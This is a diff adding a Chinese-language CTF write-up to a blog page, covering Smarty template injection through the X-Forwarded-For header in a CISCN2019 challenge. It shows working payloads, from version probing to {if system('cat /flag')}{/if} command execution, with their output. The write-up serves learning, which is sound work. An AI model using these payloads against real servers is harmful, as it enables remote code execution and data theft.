@@ -178,6 +178,31 @@
 <p>这里的b，指的是我们之前select的1，2中的2， 如想看第一列，使用以下语句：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> b, <span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tableX)a;</span><br></pre></td></tr></table></figure></li>
 </ol>
+<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smart ssti:</span><br><span class="line">smart是php的模板引擎，模板引擎的作用就是分离前端页面和数据的，题目中显示API的URL由于环境的原因无法使用，但我们的IP依旧显示在了页面的右上角，且根据它的提示XFF我们很容易想到，在X-Forwarded-For里构造ssti：payload。</span><br><span class="line"></span><br><span class="line">Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，那么我们可以使用&#123;php&#125;&#123;/php&#125;标签来构造payload，但是本题会报错</span><br><span class="line">因为现在的smart已经不用此标签了。</span><br><span class="line">可以用&#123;$smarty.version&#125;来看一下版本。</span><br></pre></td></tr></table></figure>
+
+
+
+<ol>
+<li><p>第一步看wp（bushi ，知识点为 smart ssti</p>
+</li>
+<li><p>根据提示，抓包构造X-Forwarded-For</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#123;*comment*&#125;b</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Current IP:ab</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，那么我们可以使用&#123;php&#125;&#123;/php&#125;标签来构造payload，但是本题会报错</span><br><span class="line">因为现在的smart已经不用此标签了。</span><br><span class="line">可以用&#123;$smarty.version&#125;来看一下版本。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Current IP:a3.1.30b</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">虽然php标签不能用，但是还有个&#123;if&#125;标签。 Smarty的&#123;if&#125;条件判断和PHP的if</span><br><span class="line">非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;. 也可以使用&#123;else&#125; 和 &#123;elseif&#125;.</span><br><span class="line">全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等</span><br><span class="line"></span><br><span class="line">既然全部的PHP条件表达式和函数都可以在if内使用,那我们在里面写php代码也行。 &#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
 
       
     </div>
